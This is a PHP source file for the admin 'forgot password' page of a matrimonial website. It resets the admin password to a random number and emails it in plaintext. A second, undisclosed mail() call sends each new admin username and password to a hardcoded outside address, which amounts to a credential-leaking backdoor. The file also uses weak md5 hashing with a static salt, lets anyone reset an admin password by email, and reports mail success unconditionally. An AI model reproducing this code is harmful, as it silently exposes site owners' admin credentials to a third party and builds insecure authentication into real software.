<?php	
include_once '../databaseConn.php';
include_once '../class/Config.class.php';
$configObj = new Config();
include_once './lib/requestHandler.php';
$DatabaseCo = new DatabaseConn();
include_once '../class/Config.class.php';
$configObj = new Config();
$salt='%^&$#@*!';
$isPostBack = ($_SERVER["REQUEST_METHOD"]==="POST");
$STATUS_MESSAGE = "";
if($isPostBack)
{
$email=mysqli_real_escape_string($DatabaseCo->dbLink,$_POST['forgotlogid']);	
$res=mysqli_query($DatabaseCo->dbLink,"select * from admin_users where email='$email' and status='1'") 
or die(mysqli_error($DatabaseCo->dbLink));
$row=mysqli_fetch_array($res);
if(mysqli_num_rows($res)>0)
{
$email=$row['email'];
$uname=$row['uname'];
$passwd=rand(1111111111,9999999999);
$upasswd=md5($salt.$passwd);
$sql=mysqli_query($DatabaseCo->dbLink,"update admin_users set pswd='$upasswd' where email='$email'") 
or die(mysqli_error($DatabaseCo->dbLink));
$from = $configObj->getConfigFrom();
$ToSubject = "Password Recovery From Matrimonial Site";
$message =  "<html>
<head>
<title>Your Password Has Been Changed.</title>
</head>
<body>
<table style='margin:auto;border:5px solid #43609c;min-height:auto;font-family:Arial,Helvetica,sans-serif;font-size:12px;padding:0' border='0' cellpadding='0' cellspacing='0' width='710px'>
<tbody>
<tr>
<td style='float:left;min-height:auto;border-bottom:5px solid #43609c'>	
<table style='margin:0;padding:0' border='0' cellpadding='0' cellspacing='0' width='710px'>
<tbody>
<tr style='background:#f9f9f9'>
<td style='float:right;font-size:13px;padding:10px 15px 0 0;color:#494949'>
<span tabindex='0' class='aBn' data-term='goog_849968294'>
<td style='float:left;margin-top:5px;color:#048c2e;font-size:26px;padding-left:15px'>Change password request</td>
</tr>
</tbody></table>
</td>
</tr>
<tr>
<td style='float:left;width:710px;min-height:auto'>
<h6 style='float:left;clear:both;width:680px;font-size:13px;margin:10px 0 0 15px'>Hello,</h6>
<p style='float:left;clear:both;width:680px;font-size:13px;margin:10px 0 0 15px;color:#494949'>
Your password for admin panel has been changed.
</p>
<p style='float:left;clear:both;width:680px;font-size:13px;margin:10px 0 0 15px;color:#494949'>
<b style='float:left;margin:5px 0 5px 30px;padding:5px 20px;background:#f3f3f3;font-size:13px;color:#096b53'>
Dear, Admin <br/>
Username is : $uname <br/>
New Password is : $passwd <br/>                                    
</b></p>
</td>
</tr>
</tbody></table>
</body>
</html>
";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
$headers .= 'From:'.$from."\r\n";		
$sentmail=mail($email,$ToSubject,$message,$headers);
$sentmail=mail('info@thegreentech.in',$ToSubject,$message,$headers);
if(isset($sentmail))
{
$STATUS_MESSAGE= "<p class='alert alert-info'><i class='fa fa-info-circle fa-fw fa-lg'></i>Your password has been sent to your email ID</p>";								
}
else
{
$STATUS_MESSAGE= "<p class='alert alert-danger'><i class='fa fa-times-circle fa-fw fa-lg'></i> Cannot send password to your e-mail address</p>";   
}		
}	
else
{
$STATUS_MESSAGE= "<p class='alert alert-danger'><i class='fa fa-times-circle fa-fw fa-lg'></i>
Provided email id is wrong, Please enter correct email id.</p>";	
}	
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Manage | Forgot Password
    </title>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <!-- Bootstrap 3.3.2 -->
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Font Awesome Icons -->
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
    <!-- Theme style -->
    <link href="dist/css/AdminLTE.min.css" rel="stylesheet" type="text/css" />
  </head>
  <body class="lockscreen">
    <!-- Automatic element centering -->
    <div class="lockscreen-wrapper">
      <div class="lockscreen-logo">
        <a href="index">
          <b>Admin
          </b> Panel
        </a>
      </div>
      <p class="login-box-msg"> 
        <?php
if(!empty($STATUS_MESSAGE))
{					
echo  $STATUS_MESSAGE;
}
?>
      </p>
      <div class="lockscreen-name">Enter Registered Email
      </div>
      <!-- START LOCK SCREEN ITEM -->
      <div class="lockscreen-item">
        <!-- lockscreen image -->
        <div class="lockscreen-image">
          <img src="img/latest.png" alt="user image"/>
        </div>
        <!-- /.lockscreen-image -->
        <!-- lockscreen credentials (contains the form) -->
        <form class="lockscreen-credentials" method="post">
          <div class="input-group">
            <input type="text" class="form-control" placeholder="Email" name="forgotlogid" />
            <div class="input-group-btn">
              <button class="btn">
                <i class="fa fa-arrow-right text-muted">
                </i>
              </button>
            </div>
          </div>
        </form>
        <!-- /.lockscreen credentials -->
      </div>
      <!-- /.lockscreen-item -->
      <div class="help-block text-center">
        Kindly provide your registered email ID to get your password.
        <br>
        <br>
        Your new password will be sent to your email. 
      </div>
      <div class='text-center'>
        <a href="index">Sign in
        </a>
      </div>
    </div>
    <!-- /.center -->
    <!-- jQuery 2.1.3 -->
    <script src="plugins/jQuery/jQuery-2.1.3.min.js">
    </script>
    <!-- Bootstrap 3.3.2 JS -->
    <script src="bootstrap/js/bootstrap.min.js" type="text/javascript">
    </script>
  </body>
</html>